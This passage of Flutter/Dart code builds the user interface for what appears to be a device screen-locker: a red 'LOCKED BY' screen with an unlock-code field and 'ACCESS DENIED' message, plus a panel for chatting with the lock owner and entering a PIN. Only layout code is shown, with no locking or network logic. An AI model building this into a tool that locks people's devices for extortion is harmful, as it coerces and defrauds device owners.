      child: SingleChildScrollView(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.gpp_maybe, color: Colors.red, size: 100),
            const SizedBox(height: 20),
            Text(
              'LOCKED BY: ${_lockOwnerName.toUpperCase()}',
              style: const TextStyle(
                color: Colors.redAccent,
                fontSize: 14,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 20),
            Text(
              _lockMessageLocal,
              style: const TextStyle(
                fontSize: 20,
                color: Colors.red,
                fontWeight: FontWeight.bold,
              ),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 30),
            Container(
              margin: const EdgeInsets.symmetric(horizontal: 30),
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.85),
                borderRadius: BorderRadius.circular(25),
                border: Border.all(color: Colors.red.shade900, width: 2),
              ),
              child: Column(
                children: [
                  const Text(
                    '🔐 ENTER UNLOCK CODE 🔐',
                    style: TextStyle(color: Colors.redAccent, fontSize: 12),
                  ),
                  const SizedBox(height: 15),
                  TextField(
                    controller: _pinCtrl,
                    obscureText: true,
                    autofocus: true,
                    keyboardType: TextInputType.number,
                    textAlign: TextAlign.center,
                    style: const TextStyle(
                        color: Colors.red, fontSize: 28, letterSpacing: 10),
                    decoration: InputDecoration(
                      hintText: '●●●●',
                      hintStyle: TextStyle(color: Colors.red.withOpacity(0.3)),
                      filled: true,
                      fillColor: Colors.black.withOpacity(0.8),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(15),
                        borderSide: BorderSide(color: Colors.red.shade900),
                      ),
                    ),
                    onSubmitted: _tryUnlock,
                  ),
                  const SizedBox(height: 20),
                  ElevatedButton(
                    onPressed: () => _tryUnlock(_pinCtrl.text),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.red,
                      minimumSize: const Size(double.infinity, 50),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(15),
                      ),
                    ),
                    child: const Text(
                      'UNLOCK',
                      style: TextStyle(
                          color: Colors.white, fontWeight: FontWeight.bold),
                    ),
                  ),
                  if (_wrongPin) ...[
                    const SizedBox(height: 15),
                    const Text(
                      'ACCESS DENIED! WRONG CODE!',
                      style: TextStyle(color: Colors.red),
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildLockLiveUI(List<Map<String, String>> msgs) {
    return Center(
      child: Container(
        margin: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.85),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: Colors.green, width: 2),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: const BoxDecoration(
                color: Colors.green,
                borderRadius: BorderRadius.only(
                  topLeft: Radius.circular(20),
                  topRight: Radius.circular(20),
                ),
              ),
              child: Row(
                children: [
                  const Icon(Icons.lock, color: Colors.black),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Text(
                      _lockMessageLocal,
                      style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold),
                    ),
                  ),
                ],
              ),
            ),
            SizedBox(
              height: 250,
              child: msgs.isEmpty
                  ? const Center(child: Text('No messages', style: TextStyle(color: Colors.green)))
                  : ListView.builder(
                      controller: _chatScroll,
                      itemCount: msgs.length,
                      itemBuilder: (_, i) {
                        final m = msgs[i];
                        return ListTile(
                          title: Text(m['text'] ?? '', style: const TextStyle(color: Colors.white)),
                          subtitle: Text(m['from'] ?? '', style: const TextStyle(color: Colors.green)),
                        );
                      },
                    ),
            ),
            Padding(
              padding: const EdgeInsets.all(12),
              child: Column(
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: TextField(
                          controller: _chatCtrl,
                          style: const TextStyle(color: Colors.white),
                          decoration: const InputDecoration(
                            hintText: 'Send message...',
                            hintStyle: TextStyle(color: Colors.grey),
                            border: OutlineInputBorder(),
                          ),
                          onSubmitted: _sendChatReply,
                        ),
                      ),
                      IconButton(
                        icon: const Icon(Icons.send, color: Colors.green),
                        onPressed: () => _sendChatReply(_chatCtrl.text),
                      ),
                    ],
                  ),
                  const SizedBox(height: 10),
                  Row(
                    children: [
                      Expanded(
                        child: TextField(
                          controller: _pinCtrl,
                          obscureText: true,
                          keyboardType: TextInputType.number,
                          style: const TextStyle(color: Colors.white, fontSize: 20),
                          decoration: const InputDecoration(
                            hintText: 'PIN',
                            hintStyle: TextStyle(color: Colors.grey),
                            border: OutlineInputBorder(),
                          ),
                          onSubmitted: _tryUnlock,
                        ),
                      ),
                      const SizedBox(width: 10),
                      ElevatedButton(
                        onPressed: () => _tryUnlock(_pinCtrl.text),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                        child: const Text('UNLOCK'),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}